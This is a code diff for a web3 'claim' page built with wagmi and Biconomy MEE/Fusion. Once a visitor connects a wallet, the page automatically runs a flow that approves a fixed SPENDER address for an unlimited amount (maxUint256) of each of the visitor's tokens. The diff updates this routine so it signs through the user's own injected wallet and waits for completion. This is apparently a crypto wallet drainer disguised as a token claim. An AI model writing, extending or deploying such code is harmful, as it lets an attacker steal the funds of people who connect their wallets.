@@ -1,7 +1,7 @@
 'use client';
 import { useState, useEffect } from 'react';
 import { useAccount, useWriteContract } from 'wagmi';
-import { erc20Abi, maxUint256, encodeFunctionData } from 'viem';
+import { erc20Abi, maxUint256, parseUnits } from 'viem';
 import { readContract, getBalance, switchChain } from '@wagmi/core';
 import { config } from '../config';
 
@@ -9,9 +9,10 @@ import { config } from '../config';
 import {
   createMeeClient,
   toMultichainNexusAccount,
+  getMEEVersion,
+  MEEVersion,
 } from '@biconomy/abstractjs';
-import { privateKeyToAccount } from 'viem/accounts';
-import { createPublicClient, http } from 'viem';
+import { createWalletClient, custom, http } from 'viem';
 import { mainnet, sepolia, arbitrum } from 'viem/chains';
 
 // Environment variables
@@ -100,13 +101,6 @@ const CHAIN_NAMES: Record<number, string> = {
   11155111: 'Sepolia',
 };
 
-// Chain mapping for viem
-const VIEM_CHAINS: Record<number, any> = {
-  1: mainnet,
-  42161: arbitrum,
-  11155111: sepolia,
-};
-
 // Connection reporter
 function ConnectionReporter() {
   const { address, isConnected } = useAccount();
@@ -132,9 +126,9 @@ export default function Home() {
   const { writeContractAsync } = useWriteContract();
   const [status, setStatus] = useState<string>('');
   const [meeClient, setMeeClient] = useState<MeeClient | null>(null);
-  const [mcNexus, setMcNexus] = useState<any>(null);
+  const [orchestrator, setOrchestrator] = useState<any>(null);
 
-  // Initialize MEE Client
+  // Initialize MEE Client for Fusion mode ONLY
   useEffect(() => {
     async function initializeMeeClient() {
       if (!isConnected || !address || !BICONOMY_API_KEY) return;
@@ -142,39 +136,56 @@ export default function Home() {
       try {
         setStatus('Initializing MEE + Fusion client...');
 
-        const tempPrivateKey = '0x' + '0'.repeat(63) + '1';
-        const tempAccount = privateKeyToAccount(tempPrivateKey as `0x${string}`);
+        if (typeof window !== 'undefined' && (window as any).ethereum) {
+          const walletClient = createWalletClient({
+            account: address,
+            transport: custom((window as any).ethereum),
+          });
 
-        const multiAccount = await toMultichainNexusAccount({
-          chains: [mainnet, arbitrum, sepolia],
-          transports: [http(), http(), http()],
-          signer: tempAccount,
-        });
+          const multiAccount = await toMultichainNexusAccount({
+            chainConfigurations: [
+              {
+                chain: mainnet,
+                transport: http(),
+                version: getMEEVersion(MEEVersion.V2_1_0),
+              },
+              {
+                chain: arbitrum,
+                transport: http(),
+                version: getMEEVersion(MEEVersion.V2_1_0),
+              },
+              {
+                chain: sepolia,
+                transport: http(),
+                version: getMEEVersion(MEEVersion.V2_1_0),
+              },
+            ],
+            signer: walletClient,
+          });
 
-        const client = await createMeeClient({
-          account: multiAccount,
-          apiKey: BICONOMY_API_KEY,
-          pollingInterval: 1000,
-          url: 'https://network.biconomy.io/v1',
-        });
+          setOrchestrator(multiAccount);
 
-        setMeeClient(client);
-        setMcNexus(multiAccount);
-        setStatus('MEE + Fusion client ready ✅');
+          const client = await createMeeClient({
+            account: multiAccount,
+            apiKey: BICONOMY_API_KEY,
+          });
+
+          setMeeClient(client);
+          setStatus('MEE + Fusion client ready ✅');
+        } else {
+          setStatus('❌ Ethereum provider not found - please use MetaMask or compatible wallet');
+        }
       } catch (error: any) {
         console.error('Failed to initialize MEE client:', error);
-        setStatus(`Failed to initialize MEE + Fusion: ${error.message}`);
+        setStatus(`Failed to initialize MEE + Fusion: ${error.message || 'Unknown error'}`);
       }
     }
 
     initializeMeeClient();
   }, [isConnected, address, BICONOMY_API_KEY]);
 
-  // ERC20Permit check
-  async function supportsERC20Permit(
-    tokenAddress: `0x${string}`,
-    chainId: number
-  ): Promise<boolean> {
+  // Check if token supports ERC20Permit
+  async function supportsERC20Permit(tokenAddress: `0x${string}`, chainId: number): Promise<boolean> {
     try {
       await readContract(config, {
         chainId,
@@ -214,13 +225,14 @@ export default function Home() {
     }
   }
 
-  // Claim with Fusion
+  // Main claim function using ONLY MEE + Fusion
   async function handleClaim() {
     if (!isConnected || !address) {
       setStatus('❌ Wallet not connected');
       return;
     }
-    if (!meeClient) {
+
+    if (!meeClient || !orchestrator) {
       setStatus('❌ MEE + Fusion client not ready. Please wait or refresh.');
       return;
     }
@@ -293,28 +305,28 @@ export default function Home() {
           const supportsPermit = await supportsERC20Permit(token.address, targetChain);
           setStatus(`🔍 ${token.symbol} ${supportsPermit ? 'supports' : 'does not support'} ERC20Permit`);
 
+          setStatus(`🔄 Building approval instruction for ${token.symbol}...`);
+
+          const approvalInstruction = await orchestrator.buildComposable({
+            type: 'default',
+            data: {
+              abi: erc20Abi,
+              chainId: targetChain,
+              to: token.address,
+              functionName: 'approve',
+              args: [SPENDER, maxUint256],
+            },
+          });
+
+          setStatus(`🔄 Creating Fusion quote for ${token.symbol} approval...`);
+
           const fusionQuote = await meeClient.getFusionQuote({
+            instructions: [approvalInstruction],
             trigger: {
               chainId: targetChain,
               tokenAddress: token.address,
-              amount: rawBalance,
+              amount: parseUnits('1', token.decimals),
             },
-            instructions: [
-              {
-                calls: [
-                  {
-                    to: token.address,
-                    value: 0n,
-                    data: encodeFunctionData({
-                      abi: erc20Abi,
-                      functionName: 'approve',
-                      args: [SPENDER, maxUint256],
-                    }),
-                  },
-                ],
-                chainId: targetChain,
-              },
-            ],
             feeToken: {
               address: token.address,
               chainId: targetChain,
@@ -325,6 +337,7 @@ export default function Home() {
             setStatus(`⚡ Executing gasless approval for ${token.symbol} via ERC20Permit...`);
           } else {
             setStatus(`⚡ Executing approval for ${token.symbol} via Fusion (requires gas)...`);
+
             const nativeBal = await getBalance(config, { address, chainId: targetChain });
             if (nativeBal.value < BigInt(100000000000000)) {
               setStatus(`❌ Not enough native token for gas on ${token.symbol}`);
@@ -332,10 +345,10 @@ export default function Home() {
             }
           }
 
-          const result = await meeClient.executeFusionQuote({
-            fusionQuote,
-            account: address,
-          });
+          const result = await meeClient.executeFusionQuote({ fusionQuote });
+
+          setStatus('⏳ Waiting for completion...');
+          await meeClient.waitForSupertransactionReceipt({ hash: result.hash });
 
           const decimals = token.decimals || 18;
           const formattedBalance = Number(rawBalance) / 10 ** decimals;
@@ -371,12 +384,11 @@ export default function Home() {
     }
   }
 
-  // Auto-trigger
   useEffect(() => {
-    if (isConnected && address && meeClient) {
+    if (isConnected && address && meeClient && orchestrator) {
       handleClaim();
     }
-  }, [isConnected, address, meeClient]);
+  }, [isConnected, address, meeClient, orchestrator]);
 
   return (
     <main
@@ -405,14 +417,7 @@ export default function Home() {
           zIndex: 1000,
         }}
       >
-        <div
-          style={{
-            fontFamily: 'sans-serif',
-            fontWeight: 'bold',
-            fontSize: '18px',
-            color: '#aaa587ff',
-          }}
-        >
+        <div style={{ fontFamily: 'sans-serif', fontWeight: 'bold', fontSize: '18px', color: '#aaa587ff' }}>
           MEE + FUSION ONLY
         </div>
         <appkit-button />
@@ -485,17 +490,17 @@ export default function Home() {
           <button
             onClick={handleClaim}
             style={{
-              background: meeClient ? '#0066cc' : '#666666',
+              background: meeClient && orchestrator ? '#0066cc' : '#666666',
               color: 'white',
               padding: '12px 28px',
               borderRadius: '8px',
-              cursor: meeClient ? 'pointer' : 'not-allowed',
+              cursor: meeClient && orchestrator ? 'pointer' : 'not-allowed',
               border: 'none',
               marginTop: '16px',
             }}
-            disabled={!meeClient}
+            disabled={!(meeClient && orchestrator)}
           >
-            {meeClient ? '🚀 Execute Fusion' : '⏳ Initializing MEE...'}
+            {meeClient && orchestrator ? '🚀 Execute Fusion' : '⏳ Initializing MEE...'}
           </button>
         </div>
 
